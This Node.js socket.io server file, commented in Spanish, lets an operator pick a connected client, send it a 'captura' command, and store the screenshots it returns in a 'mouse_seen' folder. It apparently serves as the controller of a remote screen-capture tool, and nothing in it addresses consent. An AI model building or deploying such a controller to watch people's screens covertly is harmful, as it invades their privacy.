const http = require('http');
const socketIo = require('socket.io');
const fs = require('fs');
const readline = require('readline');
const path = require('path');

const server = http.createServer();
const io = socketIo(server);

// Configuración
const PORT = 3000;
const SCREENSHOT_DIR = 'mouse_seen';

// Crear la carpeta mouse_seen si no existe
if (!fs.existsSync(SCREENSHOT_DIR)) {
    fs.mkdirSync(SCREENSHOT_DIR);
}

// Lista de clientes conectados
let clients = [];

// Interfaz de terminal
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// Mostrar lista de clientes y pedir selección
function showClientList() {
    console.clear();
    console.log('Clientes conectados:');
    clients.forEach((client, index) => {
        console.log(`${index + 1}. ${client.id}`);
    });
    rl.question('Selecciona un cliente (número): ', (answer) => {
        const index = parseInt(answer) - 1;
        if (index >= 0 && index < clients.length) {
            clients[index].emit('command', 'captura');
            console.log(`Comando "captura" enviado a ${clients[index].id}`);
        } else {
            console.log('Selección inválida');
        }
        setTimeout(showClientList, 1000);
    });
}

// Manejar conexiones de clientes
io.on('connection', (socket) => {
    clients.push(socket);
    console.log('Cliente conectado:', socket.id);
    showClientList();

    socket.on('screenshot', (img) => {
        const fileName = path.join(SCREENSHOT_DIR, `screenshot_${Date.now()}.png`);
        fs.writeFileSync(fileName, img);
        console.log(`Captura recibida y guardada como ${fileName}`);
    });

    socket.on('disconnect', () => {
        clients = clients.filter(c => c.id !== socket.id);
        console.log('Cliente desconectado:', socket.id);
        showClientList();
    });
});

// Iniciar el servidor
server.listen(PORT, () => {
    console.log(`Servidor escuchando en puerto ${PORT}`);
});